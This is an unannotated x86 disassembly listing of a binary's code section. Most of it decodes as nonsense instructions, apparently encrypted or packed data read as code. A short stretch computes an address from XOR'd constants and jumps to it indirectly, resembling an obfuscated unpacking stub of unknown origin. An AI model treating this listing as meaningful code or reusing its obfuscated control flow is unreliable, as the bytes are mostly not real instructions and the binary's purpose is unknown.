  40cb20:	iret   
  40cb21:	xchg   esp,eax
  40cb22:	push   ebp
  40cb23:	(bad)  
  40cb24:	sbb    dh,al
  40cb26:	sub    eax,0x5fdefee
  40cb2b:	mov    al,ds:0xfaf2093f
  40cb30:	inc    esp
  40cb31:	xor    DWORD PTR [ecx+0x71374a69],esp
  40cb37:	add    al,BYTE PTR [edi+0x38192549]
  40cb3d:	js     0x40cb49
  40cb3f:	scas   al,BYTE PTR es:[edi]
  40cb40:	fs in  al,0x33
  40cb43:	imul   esp,eax,0x6433761
  40cb49:	cdq    
  40cb4a:	inc    ecx
  40cb4b:	aam    0x7d
  40cb4d:	or     BYTE PTR [eax-0x12],bh
  40cb50:	gs xchg edi,eax
  40cb52:	pusha  
  40cb53:	(bad)  
  40cb54:	pushf  
  40cb55:	call   0xf35e:0x9255208f
  40cb5c:	jne    0x40cbd2
  40cb5e:	and    ecx,DWORD PTR [ebp-0x2d]
  40cb61:	push   cs
  40cb62:	push   es
  40cb63:	dec    edi
  40cb64:	(bad)  
  40cb65:	inc    edx
  40cb66:	pop    esi
  40cb67:	loope  0x40cb84
  40cb69:	ss call 0xf8e68578
  40cb6f:	cli    
  40cb70:	jmp    0xb67acc07
  40cb75:	(bad)  
  40cb76:	jmp    0x3666:0x20a8edee
  40cb7d:	pop    ecx
  40cb7e:	xchg   ebx,eax
  40cb7f:	ja     0x40cb19
  40cb81:	or     al,0x8c
  40cb83:	jo     0x40cbcf
  40cb85:	dec    ebx
  40cb86:	nop
  40cb87:	or     ah,bh
  40cb89:	aaa    
  40cb8a:	mov    al,0x9f
  40cb8c:	add    eax,0x5da91192
  40cb91:	rol    DWORD PTR [eax+0x50],0xf2
  40cb95:	lods   eax,DWORD PTR ds:[esi]
  40cb96:	add    eax,esi
  40cb98:	imul   eax,DWORD PTR [edx]
  40cb9b:	mov    edx,DWORD PTR [ebp-0x4]
  40cb9e:	xor    edx,ecx
  40cba0:	mov    ecx,DWORD PTR [ebp+0x8]
  40cba3:	lea    ecx,[edx+ecx*1+0x32729b]
  40cbaa:	cmp    ecx,eax
  40cbac:	jne    0x40c41f
  40cbb2:	mov    ebx,esi
  40cbb4:	jmp    0x40cbbe
  40cbb9:	mov    ebx,0x32729b
  40cbbe:	mov    eax,DWORD PTR [ebp-0x4]
  40cbc1:	xor    eax,0x7510854
  40cbc6:	add    eax,ebx
  40cbc8:	mov    DWORD PTR [ebp-0xc],eax
  40cbcb:	xor    ebx,ebx
  40cbcd:	lea    eax,[ebp-0x10]
  40cbd0:	add    ebx,DWORD PTR [eax]
  40cbd2:	call   ebx
  40cbd4:	xor    ebx,ebx
  40cbd6:	inc    ebx
  40cbd7:	cmp    DWORD PTR [ebp+0x10],ebx
  40cbda:	je     0x40d321
  40cbe0:	xchg   edx,eax
  40cbe1:	push   0xa
  40cbe3:	pop    ecx
  40cbe4:	push   0x4
  40cbe6:	pop    ebx
  40cbe7:	inc    ebx
  40cbe8:	xchg   ebx,ecx
  40cbea:	jmp    0x40ce4d
  40cbef:	imul   edx,DWORD PTR [edi-0x4b0ecbf3],0x73
  40cbf6:	push   ecx
  40cbf7:	int3   
  40cbf8:	xor    esp,DWORD PTR [esi+edi*8+0x56]
  40cbfc:	sbb    ch,bl
  40cbfe:	mov    ah,BYTE PTR [edx-0x74]
  40cc01:	jle    0x40cc81
  40cc03:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40cc07:	adc    BYTE PTR ds:0xd22b2548,dh
  40cc0d:	sub    esp,ebp
  40cc0f:	push   ecx
  40cc10:	or     DWORD PTR [edi],0xf4f5f790
  40cc16:	popf   
  40cc17:	les    edi,FWORD PTR [ebx+0x3d]
  40cc1a:	xchg   edi,eax
  40cc1b:	popf   
  40cc1c:	jle    0x40cbb9
  40cc1e:	push   es
  40cc1f:	push   ss
  40cc20:	or     eax,0x900677df
  40cc25:	gs push ds
  40cc27:	daa    
  40cc28:	lahf   
  40cc29:	adc    eax,DWORD PTR [ecx]
  40cc2b:	ds fwait
  40cc2d:	pushf  
  40cc2e:	cld    
  40cc2f:	cmp    eax,edi
  40cc31:	push   edi
  40cc32:	or     al,ch
  40cc34:	sub    DWORD PTR [eax+eiz*4],ebx
  40cc37:	lahf   
  40cc38:	fcomp  QWORD PTR [ecx]
  40cc3a:	sbb    BYTE PTR [esi-0x67f0919a],al
  40cc40:	sahf   
  40cc41:	adc    BYTE PTR [ebp-0x2f882c01],ah
  40cc47:	push   0xf4a0f9b1
  40cc4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc4d:	mov    ds:0x2d5603bd,al
  40cc52:	mov    eax,0xcef849a6
  40cc57:	pop    ds
  40cc58:	fwait
  40cc59:	cmp    ch,dl
  40cc5b:	ja     0x40cbf9
  40cc5d:	mov    ebp,0x35c1d099
  40cc62:	sar    DWORD PTR ds:0xc62053,1
  40cc68:	xchg   edx,eax
  40cc69:	xchg   esp,eax
  40cc6a:	std    
  40cc6b:	jl     0x40cc29
  40cc6d:	mov    eax,DWORD PTR [ecx-0x7b]
  40cc70:	call   0x16df:0x65e0e910
  40cc77:	sub    BYTE PTR [ebx],dl
  40cc79:	lea    ebp,[esp+eax*8+0x18]
  40cc7d:	popa   
  40cc7e:	scas   al,BYTE PTR es:[edi]
  40cc7f:	inc    eax
  40cc80:	rol    ah,cl
  40cc82:	lds    ebp,FWORD PTR [ebx+0x7282b212]
  40cc88:	out    dx,eax
  40cc89:	xchg   ebx,eax
  40cc8a:	adc    ah,0x45
  40cc8d:	dec    ebp
  40cc8e:	in     eax,0x21
  40cc90:	or     DWORD PTR [ebp+0x5f],ecx
  40cc93:	pop    edi
  40cc94:	cmp    BYTE PTR [edx],bl
  40cc96:	adc    eax,0xeedace59
  40cc9b:	ds push edi
  40cc9d:	sbb    DWORD PTR [esp+edi*4-0x216f7381],0x737f78fd
  40cca8:	cs jne 0x40cd04
  40ccab:	cmp    eax,0xf7f4adcf
  40ccb0:	aam    0x9
  40ccb2:	add    al,0x1d
  40ccb4:	aam    0xd9
  40ccb6:	in     eax,0x74
  40ccb8:	mov    ds:0x94ea0844,eax
  40ccbd:	pop    edx
  40ccbe:	gs sub al,0xbe
  40ccc1:	push   ds
  40ccc2:	push   edi
  40ccc3:	dec    eax
  40ccc4:	pop    esp
  40ccc5:	ss out dx,eax
  40ccc7:	pop    ss
  40ccc8:	in     eax,0x28
  40ccca:	out    0x38,eax
  40cccc:	bndldx (bad),[ecx]
  40cccf:	iret   
  40ccd0:	(bad)  
  40ccd1:	and    DWORD PTR [esi],ecx
  40ccd3:	jbe    0x40cd02
  40ccd5:	or     BYTE PTR [ecx-0x17],bh
  40ccd8:	ret    0x522a
  40ccdb:	mov    ah,0x0
  40ccdd:	out    dx,al
  40ccde:	cwde   
  40ccdf:	jecxz  0x40ccfb
  40cce1:	call   0xa55e59d7
  40cce6:	push   esp
  40cce7:	jne    0x40cd68
  40cce9:	adc    al,0x85
  40cceb:	cmp    DWORD PTR gs:[eax],esi
  40ccee:	clc    
  40ccef:	inc    edx
  40ccf0:	fcom   QWORD PTR [edi+0x57887e3a]
  40ccf6:	xlat   BYTE PTR ds:[ebx]
  40ccf7:	and    ebp,DWORD PTR [eax+eiz*1+0x6b]
  40ccfb:	ret    0x36ff
  40ccfe:	lock pop esp
  40cd00:	adc    DWORD PTR [eax],0x3e
  40cd03:	dec    edi
  40cd04:	arpl   WORD PTR [edx],bp
  40cd06:	aaa    
  40cd07:	xchg   ebp,eax
  40cd08:	retf   0xd4af
  40cd0b:	jecxz  0x40cd86
  40cd0d:	sbb    ebp,ecx
  40cd0f:	loope  0x40cd38
  40cd11:	jle    0x40ccb7
  40cd13:	shr    esi,1
  40cd15:	aad    0xa3
  40cd17:	pop    ds
  40cd18:	jns    0x40cd52
  40cd1a:	cwde   
  40cd1b:	jg     0x40ccb9
  40cd1d:	pusha  
  40cd1e:	adc    al,0xae
  40cd20:	or     al,0x70
  40cd22:	gs retf 
  40cd24:	in     eax,0x95
  40cd26:	stos   BYTE PTR es:[edi],al
  40cd27:	mov    al,0x85
  40cd29:	gs push ds
  40cd2b:	sub    al,BYTE PTR [esi-0x66ab1cf7]
  40cd31:	pop    es
  40cd32:	pop    ss
  40cd33:	dec    ebx
  40cd34:	push   eax
  40cd35:	aam    0x4d
  40cd37:	ins    DWORD PTR es:[edi],dx
  40cd38:	out    dx,al
  40cd39:	rcl    BYTE PTR [eax],0x53
  40cd3c:	and    ch,ah
  40cd3e:	shl    DWORD PTR [ebx+0x28],1
  40cd41:	arpl   WORD PTR [eax],si
  40cd43:	mov    ecx,0x8ae9526f
  40cd48:	fcmovu st,st(1)
  40cd4a:	fwait
  40cd4b:	push   ebp
  40cd4c:	call   0xec5ecd27
  40cd51:	(bad)  
  40cd52:	fdiv   DWORD PTR [ebx]
  40cd54:	xchg   ebp,eax
  40cd55:	cmp    al,0xcf
  40cd57:	adc    bh,BYTE PTR [eax]
  40cd59:	or     eax,0xd21b8a7d
  40cd5e:	add    al,0x18
  40cd60:	add    BYTE PTR [eax],0xec
  40cd63:	push   es
  40cd64:	cdq    
  40cd65:	jmp    0x1421:0x91af9061
  40cd6c:	and    BYTE PTR [edx],ah
  40cd6e:	lahf   
  40cd6f:	sub    eax,0x2225cf3e
  40cd74:	dec    ecx
  40cd75:	xchg   esi,eax
  40cd76:	into   
  40cd77:	add    eax,0x189b209
  40cd7c:	xor    al,0x84
  40cd7e:	stc    
  40cd7f:	sahf   
  40cd80:	test   al,0x92
  40cd82:	lods   eax,DWORD PTR ds:[esi]
  40cd83:	sahf   
  40cd84:	repz dec eax
  40cd86:	enter  0xb9c6,0x5d
  40cd8a:	jnp    0x40cd53
  40cd8c:	cmp    ebp,edx
  40cd8e:	mov    dl,0xa8
  40cd90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd91:	dec    esi
  40cd92:	nop
  40cd93:	xchg   BYTE PTR [edx],bh
  40cd95:	dec    esi
  40cd96:	inc    BYTE PTR [ecx]
  40cd98:	call   0x83f6:0x119fe82
  40cd9f:	mov    esp,0x781969d6
  40cda4:	sbb    al,0x6a
  40cda6:	cs jb  0x40cd2e
  40cda9:	jo     0x40cd40
  40cdab:	ins    BYTE PTR es:[edi],dx
  40cdac:	push   esp
  40cdad:	mov    eax,0xfa1091e1
  40cdb2:	pcmpgtb mm3,QWORD PTR [ebp-0x46]
  40cdb6:	pushf  
  40cdb7:	mov    ds:0xc81de827,eax
  40cdbc:	and    al,0x15
  40cdbe:	ja     0x40cdf6
  40cdc0:	js     0x40cd6b
  40cdc2:	mov    ds:0x4dfee1a,al
  40cdc7:	repz pop esp
  40cdc9:	dec    esp
  40cdca:	das    
  40cdcb:	fnsave [esi*8+0xb0dec5a]
  40cdd2:	jb     0x40ce14
  40cdd4:	mov    ah,0xd8
  40cdd6:	pop    ecx
  40cdd7:	(bad)  
  40cdd8:	loope  0x40cd73
  40cdda:	cs pop edi
  40cddc:	xchg   ebx,eax
  40cddd:	cdq    
  40cdde:	xchg   esi,eax
  40cddf:	push   eax
  40cde0:	jne    0x40cd86
  40cde2:	sub    BYTE PTR [eax+0x7ed87f14],ah
  40cde8:	das    
  40cde9:	imul   ebp,ecx,0xc
  40cdec:	dec    edx
  40cded:	pop    edx
  40cdee:	dec    ebp
  40cdef:	loopne 0x40cdb3
  40cdf1:	shr    eax,cl
  40cdf3:	cdq    
  40cdf4:	mov    ecx,0xb020c746
  40cdf9:	xchg   ecx,eax
  40cdfa:	xchg   ebx,ebp
  40cdfc:	imul   esp,DWORD PTR [eax-0x24ad620c],0x58
  40ce03:	aad    0x1b
  40ce05:	cld    
  40ce06:	push   0xced72260
  40ce0b:	pop    es
  40ce0c:	or     BYTE PTR [ebp+0x1e],al
  40ce0f:	xchg   DWORD PTR ds:0x7d40c9e1,edx
  40ce15:	dec    eax
  40ce16:	fisub  WORD PTR [edx-0x61]
  40ce19:	sub    al,0x49
  40ce1b:	dec    ebp
  40ce1c:	sbb    al,0x8
  40ce1e:	jbe    0x40ce6a
  40ce20:	xchg   ebp,eax
  40ce21:	les    eax,FWORD PTR [ecx]
  40ce23:	cmp    dh,BYTE PTR [esi-0x14]
  40ce26:	fdivrp st(5),st
  40ce28:	add    DWORD PTR [ecx+ecx*2],esi
  40ce2b:	mov    DWORD PTR [ecx-0x6],ebx
  40ce2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce2f:	pop    ds
  40ce30:	dec    edx
  40ce31:	shl    DWORD PTR [ecx],cl
  40ce33:	push   0xef68b655
  40ce38:	not    bl
  40ce3a:	stos   BYTE PTR es:[edi],al
  40ce3b:	ficomp DWORD PTR [esi+0x408a7409]
  40ce41:	ins    DWORD PTR es:[edi],dx
  40ce42:	out    0x12,al
  40ce44:	or     DWORD PTR [edx+0x39],0xffffff9d
  40ce48:	mov    ebp,0x9a660ee
  40ce4d:	sub    ebx,ecx
  40ce4f:	xchg   ebx,ecx
  40ce51:	jmp    0x40d0b4
  40ce56:	push   ebx
  40ce57:	std    
  40ce58:	dec    ebx
  40ce59:	sahf   
  40ce5a:	push   ecx
  40ce5b:	push   0x84027173
  40ce60:	add    al,0xed
  40ce62:	ins    BYTE PTR es:[edi],dx
  40ce63:	pop    esp
  40ce64:	jmp    0x387e:0x7e8b2c0b
  40ce6b:	jl     0x40ceeb
  40ce6d:	jle    0x40ce19
  40ce6f:	sti    
  40ce70:	inc    eax
  40ce71:	cdq    
  40ce72:	shr    BYTE PTR [ebp+edi*2-0x1d],cl
  40ce76:	in     eax,0x61
  40ce78:	call   0xc595fa0c
  40ce7d:	fisub  DWORD PTR [esi+eax*8+0x4bbcf7b4]
  40ce84:	iret   
  40ce85:	push   0xee048166
  40ce8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce8b:	push   ebp
  40ce8c:	sahf   
  40ce8d:	jmp    0x40cec0
  40ce8f:	cdq    
  40ce90:	lods   eax,DWORD PTR ds:[esi]
  40ce91:	imul   ebp,esi,0x56ef613f
  40ce97:	push   esi
  40ce98:	sar    BYTE PTR [esi],1
  40ce9a:	mov    ds:0xb0e948fa,eax
  40ce9f:	or     ah,BYTE PTR [edx+ebp*2]
  40cea2:	xchg   ecx,eax
  40cea3:	(bad)  [edi+edi*8+0x7774067a]
  40ceaa:	test   al,0x48
  40ceac:	cmp    al,0xb4
  40ceae:	in     eax,0x3d
  40ceb0:	pop    ecx
  40ceb1:	pop    esi
  40ceb2:	cli    
  40ceb3:	mul    DWORD PTR ds:0xc49d7cfe
  40ceb9:	push   0x72
  40cebb:	mov    edi,0x648d124c
  40cec0:	or     DWORD PTR [esi+eax*1+0x4d],ecx
  40cec4:	ficomp WORD PTR [ecx+0x453a4573]
  40ceca:	sub    BYTE PTR [eax],ch
  40cecc:	shl    BYTE PTR [eax+0x39],1
  40cecf:	sbb    al,0x88
  40ced1:	outs   dx,DWORD PTR ds:[esi]
  40ced2:	pop    ds
  40ced3:	iret   
  40ced4:	or     eax,0x2e36c621
  40ced9:	out    0x23,eax
  40cedb:	aas    
  40cedc:	sbb    ebp,edx
  40cede:	inc    ebp
  40cedf:	test   eax,0x7b2cc532
  40cee4:	loopne 0x40cec4
  40cee6:	adc    eax,0x6c979896
  40ceeb:	out    0x47,al
  40ceed:	aad    0x82
  40ceef:	jg     0x40ce99
  40cef1:	pusha  
  40cef2:	das    
  40cef3:	and    ecx,0x977cea6b
  40cef9:	(bad)  
  40cefa:	idiv   DWORD PTR [esp+ebx*4]
  40cefd:	push   edi
  40cefe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ceff:	aaa    
  40cf00:	imul   ebx,DWORD PTR [ecx*8-0x4a6f1037],0xf7543147
  40cf0b:	in     eax,0x7d
  40cf0d:	adc    cl,ch
  40cf0f:	retf   0x6477
  40cf12:	lea    esp,[ebx-0x3890e62a]
  40cf18:	dec    edx
  40cf19:	data16 adc BYTE PTR [edx],ch
  40cf1c:	inc    edi
  40cf1d:	inc    edi
  40cf1e:	lods   al,BYTE PTR ds:[esi]
  40cf1f:	jg     0x40ceda
  40cf21:	retf   
  40cf22:	xor    BYTE PTR [ebx],0x2e
  40cf25:	popf   
  40cf26:	mov    cl,0x45
  40cf28:	mov    esi,0x731bf9f8
  40cf2d:	xchg   ebx,eax
  40cf2e:	xlat   BYTE PTR ds:[ebx]
  40cf2f:	mov    ds:0xd2183500,eax
  40cf34:	icebp  
  40cf35:	pop    ss
  40cf36:	sub    BYTE PTR [ebp-0x59],bh
  40cf39:	jl     0x40cf69
  40cf3b:	mov    edi,0xe4588be
  40cf40:	movhps xmm1,QWORD PTR [ecx]
  40cf43:	mov    cl,0x14
  40cf46:	pop    ecx
  40cf47:	ja     0x40cf15
  40cf49:	push   ebx
  40cf4a:	xor    BYTE PTR [eax+0x24081c99],bl
  40cf50:	(bad)  
  40cf51:	ret    0xaa0f
  40cf54:	inc    esp
  40cf55:	jge    0x40cfc3
  40cf57:	repnz mov eax,ds:0x9031a367
  40cf5d:	int    0x2
  40cf5f:	shl    edi,0x94
  40cf62:	imul   edi,DWORD PTR [edi+0x2c99a43b],0x6f2d901b
  40cf6c:	mov    ebx,0xb1c46919
  40cf71:	add    ebx,ebx
  40cf73:	imul   edx,DWORD PTR [ebx],0x7d69b009
  40cf79:	cmp    eax,0x6f8a8961
  40cf7e:	xchg   ebx,eax
  40cf7f:	outs   dx,DWORD PTR ds:[esi]
  40cf80:	xor    ch,bh
  40cf82:	in     al,dx
  40cf83:	mov    BYTE PTR [ebp+0x38539574],bh
  40cf89:	mov    bh,0xa9
  40cf8b:	add    esi,ecx
  40cf8d:	push   ss
  40cf8e:	sub    edx,DWORD PTR [esi+0x30ecb39]
  40cf94:	shr    esp,cl
  40cf96:	jb     0x40cf5a
  40cf98:	shr    DWORD PTR [esi+0x48],1
  40cf9b:	aas    
  40cf9c:	xchg   ebx,eax
  40cf9d:	nop
  40cf9e:	sbb    al,0x3c
  40cfa0:	xor    eax,0x313290f5
  40cfa5:	cmp    ebp,DWORD PTR ds:0x6455fa90
  40cfab:	inc    esi
  40cfac:	sbb    edi,edi
  40cfae:	mov    esp,0xe5c06180
  40cfb3:	xchg   esp,eax
  40cfb4:	inc    esp
  40cfb5:	mov    ah,0x2f
  40cfb7:	js     0x40d008
  40cfb9:	imul   dh
  40cfbb:	test   DWORD PTR [edi+edi*2+0x14a84e6f],ecx
  40cfc2:	push   ebx
  40cfc3:	cwde   
  40cfc4:	inc    esp
  40cfc5:	not    BYTE PTR [edx-0x17812331]
  40cfcb:	inc    esp
  40cfcc:	mov    dl,0x43
  40cfce:	push   ecx
  40cfcf:	mov    al,0xee
  40cfd1:	sar    DWORD PTR [ecx+edx*1],1
  40cfd4:	ret    0x36da
  40cfd7:	push   edx
  40cfd8:	mov    ah,0x90
  40cfda:	daa    
  40cfdb:	retf   
  40cfdc:	mov    esi,0x61c97739
  40cfe1:	lds    esi,FWORD PTR [esi-0x42f8da25]
  40cfe7:	xor    DWORD PTR [edi+0x58a37f45],eax
  40cfed:	or     BYTE PTR [eax],dl
  40cfef:	and    al,0x1c
  40cff2:	loopne 0x40d06f
  40cff4:	push   esp
  40cff5:	lea    edi,ss:[ecx+0x7a5316cd]
  40cffc:	lods   eax,DWORD PTR ds:[esi]
  40cffd:	jo     0x40cffc
  40cfff:	and    DWORD PTR [edx+0x6c22043c],edi
  40d005:	dec    edi
  40d006:	outs   dx,BYTE PTR ds:[esi]
  40d007:	mov    ch,0x3c
  40d009:	cmp    DWORD PTR [esi-0x2d28b63c],ebp
  40d00f:	jno    0x40d01c
  40d011:	je     0x40d00d
  40d013:	outs   dx,DWORD PTR ds:[esi]
  40d014:	xchg   BYTE PTR [esi-0x281c13c3],dl
  40d01a:	rcl    BYTE PTR [esp+edx*4],cl
  40d01d:	sbb    BYTE PTR [ecx-0x1f],0xcd
  40d021:	mov    eax,0x33158042
  40d026:	mov    bl,BYTE PTR [ecx-0x75bbe76e]
  40d02c:	cdq    
  40d02d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d02e:	mov    eax,ds:0x35d8107b
  40d033:	das    
  40d034:	jbe    0x40d09c
  40d036:	ins    BYTE PTR es:[edi],dx
  40d037:	in     al,dx
  40d038:	mov    BYTE PTR [ebx+0x1088ee9c],dl
  40d03e:	push   ebp
  40d03f:	mov    ah,0x25
  40d041:	jo     0x40d092
  40d043:	aaa    
  40d044:	jno    0x40d0bd
  40d046:	mov    WORD PTR [bx],cs
  40d049:	add    DWORD PTR [esi+0x1c01a808],esi
  40d04f:	cmp    BYTE PTR [ebp+esi*4+0x54],cl
  40d053:	xchg   ecx,eax
  40d054:	sub    ebx,DWORD PTR ds:[edi]
  40d057:	icebp  
  40d058:	gs es (bad) 
  40d05b:	sub    BYTE PTR [edi],bh
  40d05d:	inc    edx
  40d05e:	xchg   ebx,eax
  40d05f:	jne    0x40d0b4
  40d061:	hlt    
  40d062:	stos   BYTE PTR es:[edi],al
  40d063:	pop    eax
  40d064:	pushf  
  40d065:	xor    DWORD PTR [ebx],esp
  40d067:	sbb    BYTE PTR [edi+0x2d5a7a76],dl
  40d06d:	pop    esi
  40d06e:	fs jle 0x40d038
  40d071:	push   cs
  40d072:	in     al,dx
  40d073:	jo     0x40d0e7
  40d075:	push   ecx
  40d076:	xchg   ebx,ebp
  40d078:	ja     0x40d08f
  40d07a:	neg    esp
  40d07c:	mul    DWORD PTR [ebx+edi*1-0x4c]
  40d080:	lods   eax,DWORD PTR ds:[esi]
  40d081:	(bad)  
  40d082:	(bad)  
  40d083:	fcom   DWORD PTR [edx+ecx*4]
  40d086:	sbb    al,0x4e
  40d088:	adc    DWORD PTR [ebp-0x3747e4ee],0x6b
  40d08f:	rcl    BYTE PTR [ecx+0x414adaa0],1
  40d095:	(bad)  
  40d096:	std    
  40d097:	adc    eax,0x1271ca96
  40d09c:	inc    esi
  40d09d:	or     DWORD PTR [ecx-0x7a],ebp
  40d0a0:	shl    DWORD PTR [eax-0x33],1
  40d0a3:	fimul  DWORD PTR [ecx]
  40d0a5:	mov    dh,0x87
  40d0a7:	add    esi,DWORD PTR [esi]
  40d0a9:	popf   
  40d0aa:	lods   eax,DWORD PTR ds:[esi]
  40d0ab:	mov    ah,0x9c
  40d0ad:	hlt    
  40d0ae:	and    DWORD PTR [edi],0xffffff9e
  40d0b1:	out    dx,eax
  40d0b2:	aad    0x6a
  40d0b4:	dec    ecx
  40d0b5:	mov    eax,DWORD PTR [ebp-0x1c]
  40d0b8:	imul   eax,ecx
  40d0bb:	add    esp,eax
  40d0bd:	xchg   edx,eax
  40d0be:	jmp    0x40d321
  40d0c3:	sahf   
  40d0c4:	test   BYTE PTR [edi],0xc3
  40d0c7:	push   edi
  40d0c8:	repz pop edx
  40d0ca:	jae    0x40d0bf
  40d0cc:	ficom  WORD PTR [edx+0x6a]
  40d0cf:	fcomp  DWORD PTR [ebx]
  40d0d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d0d2:	shl    esi,0x89
  40d0d5:	jle    0x40d155
  40d0d7:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40d0db:	mov    WORD PTR [edi],cs
  40d0dd:	cs into 
  40d0df:	xor    DWORD PTR [ebx],esp
  40d0e1:	sub    edx,DWORD PTR [eax]
  40d0e3:	push   esi
  40d0e4:	xor    al,0xe6
  40d0e6:	inc    esi
  40d0e7:	sti    
  40d0e8:	adc    BYTE PTR [ebx-0xdbc8d0f],ah
  40d0ee:	scas   al,BYTE PTR es:[edi]
  40d0ef:	(bad)  
  40d0f0:	lock fwait
  40d0f2:	les    ebx,FWORD PTR [eax]
  40d0f4:	(bad)  
  40d0f5:	nop
  40d0f6:	lock and BYTE PTR ss:[ebp+0x3c28a982],dl
  40d0fe:	mov    ebx,0xab43bbca
  40d103:	xor    eax,0x6033be5f
  40d108:	pop    ebp
  40d109:	jg     0x40d10e
  40d10b:	fsubr  DWORD PTR gs:[edx+0x7d]
  40d10f:	test   dh,bl
  40d111:	and    edx,DWORD PTR [eax-0x35a5f5a2]
  40d117:	push   edx
  40d118:	push   eax
  40d119:	xchg   esi,eax
  40d11a:	and    edx,eax
  40d11c:	jmp    0x7c82bb93
  40d121:	push   esi
  40d122:	jb     0x40d19d
  40d124:	outs   dx,DWORD PTR ds:[esi]
  40d125:	sub    BYTE PTR [eax-0x19],ch
  40d128:	or     eax,0xcca67ff7
  40d12d:	cmp    eax,0x3c69ffbb
  40d132:	aas    
  40d133:	cmp    ebp,DWORD PTR [edx]
  40d135:	adc    BYTE PTR [edx],bl
  40d137:	pop    ecx
  40d138:	push   ds
  40d139:	mov    al,ds:0x50e2373
  40d13e:	daa    
  40d13f:	fucomi st,st(0)
  40d141:	pop    es
  40d142:	cdq    
  40d143:	mov    ecx,0x922e1bff
  40d148:	cli    
  40d149:	inc    ecx
  40d14a:	mov    edx,0xa9d4bae5
  40d14f:	push   ecx
  40d150:	inc    edi
  40d151:	jbe    0x40d1af
  40d153:	sahf   
  40d154:	push   0x42
  40d156:	cmp    edx,DWORD PTR [ebx]
  40d158:	jne    0x40d0f1
  40d15a:	xor    dl,BYTE PTR gs:[eax+0x3d]
  40d15e:	sbb    dl,cl
  40d160:	dec    ebx
  40d161:	cdq    
  40d162:	mov    ds:0xd135ece9,eax
  40d167:	or     ecx,ebp
  40d169:	shr    bh,0x56
  40d16c:	xor    edx,esp
  40d16e:	sub    al,0x4d
  40d170:	mov    esp,0x60db6067
  40d175:	ror    DWORD PTR [edx],0xb2
  40d178:	adc    BYTE PTR [edx-0x3ecde568],dl
  40d17e:	std    
  40d17f:	push   ebx
  40d180:	jg     0x40d1c3
  40d182:	(bad)  
  40d183:	pop    ecx
  40d184:	das    
  40d185:	add    esi,ebx
  40d187:	into   
  40d188:	push   0xb0eb391b
  40d18d:	and    eax,0xbe3875ba
  40d192:	fistp  WORD PTR [ecx]
  40d194:	mov    al,ds:0xe605f41e
  40d199:	out    0x1e,al
  40d19b:	sbb    al,0x29
  40d19d:	ja     0x40d16b
  40d19f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d1a0:	(bad)  
  40d1a1:	mov    ebx,0x1a2b01b2
  40d1a6:	lock lds ebp,FWORD PTR [edi+0xf]
  40d1aa:	or     edx,0xfcc29c90
  40d1b0:	xor    eax,0xb85e60b4
  40d1b5:	jecxz  0x40d14e
  40d1b7:	pusha  
  40d1b8:	jmp    0x243c:0x6d556207
  40d1bf:	mov    al,cl
  40d1c1:	dec    esp
  40d1c2:	gs jecxz 0x40d1c7
  40d1c5:	mov    bl,0xbf
  40d1c7:	or     al,0xfa
  40d1c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1ca:	imul   ecx,esp,0x60
  40d1cd:	test   eax,0x5e0ff2e4
  40d1d2:	inc    ebx
  40d1d3:	mov    eax,0xc5def1b0
  40d1d8:	dec    esi
  40d1d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d1da:	or     eax,0x215f390
  40d1df:	scas   eax,DWORD PTR es:[edi]
  40d1e0:	int3   
  40d1e1:	adc    eax,0x8671b27a
  40d1e6:	and    dh,BYTE PTR [esi+0xdaa9eed]
  40d1ec:	and    eax,DWORD PTR [ebx-0x29]
  40d1ef:	mov    bh,0xfc
  40d1f1:	aad    0xfd
  40d1f3:	cmp    BYTE PTR [edx+edx*1-0x9091012],dh
  40d1fa:	mov    ds:0xba9747df,al
  40d1ff:	hlt    
  40d200:	xlat   BYTE PTR ds:[ebx]
  40d201:	pop    esi
  40d202:	mov    ah,bh
  40d204:	iret   
  40d205:	rcr    BYTE PTR ds:[edi*8-0x3911de00],0x12
  40d20e:	(bad)  
  40d20f:	and    dh,BYTE PTR [esi-0x4c5bbaea]
  40d215:	sub    ecx,DWORD PTR [edx+0x38]
  40d218:	add    ebx,0x6420c2c
  40d21e:	lods   eax,DWORD PTR ds:[esi]
  40d21f:	ds jo  0x40d1cd
  40d222:	and    BYTE PTR [edi-0x48fdbab9],0x55
  40d229:	xor    BYTE PTR [esi+0x68729e4a],ah
  40d22f:	dec    ebp
  40d230:	sbb    dh,BYTE PTR [esi-0x70]
  40d233:	inc    esp
  40d234:	(bad)  
  40d235:	fisttp QWORD PTR [ecx+0x7e]
  40d238:	outs   dx,BYTE PTR ds:[esi]
  40d239:	push   ecx
  40d23a:	ds jecxz 0x40d22a
  40d23d:	rcr    DWORD PTR [ebp-0x1d],cl
  40d240:	add    eax,0xf5234af0
  40d245:	xor    edi,eax
  40d247:	int3   
  40d248:	xor    eax,0xd0d9d526
  40d24d:	mov    esi,0x121d5aaf
  40d252:	pop    ebp
  40d253:	retf   
  40d254:	jb     0x40d2c1
  40d256:	data16 jp 0x40d23b
  40d259:	ret    
  40d25a:	add    al,0x1f
  40d25c:	mul    DWORD PTR [esi-0x38]
  40d25f:	fwait
  40d260:	xlat   BYTE PTR ds:[ebx]
  40d261:	repz adc DWORD PTR [esi],edx
  40d264:	loopne 0x40d2a4
  40d266:	test   eax,0x1f2663f3
  40d26b:	add    ebx,ecx
  40d26d:	daa    
  40d26e:	xor    dh,cl
  40d270:	inc    edx
  40d271:	mov    cl,0x2d
  40d273:	mov    esp,0xec671e6a
  40d278:	loop   0x40d2a2
  40d27a:	cli    
  40d27b:	rcl    DWORD PTR [edi+edi*1-0x62],1
  40d27f:	cmp    DWORD PTR ds:0x636b4941,ebp
  40d285:	lods   eax,DWORD PTR ds:[esi]
  40d286:	ror    BYTE PTR [ebp+ebp*2-0x53e61f7f],1
  40d28d:	push   0xffffffd1
  40d28f:	xor    esi,DWORD PTR [ebp+0x6f]
  40d292:	mov    edx,0x3cc67689
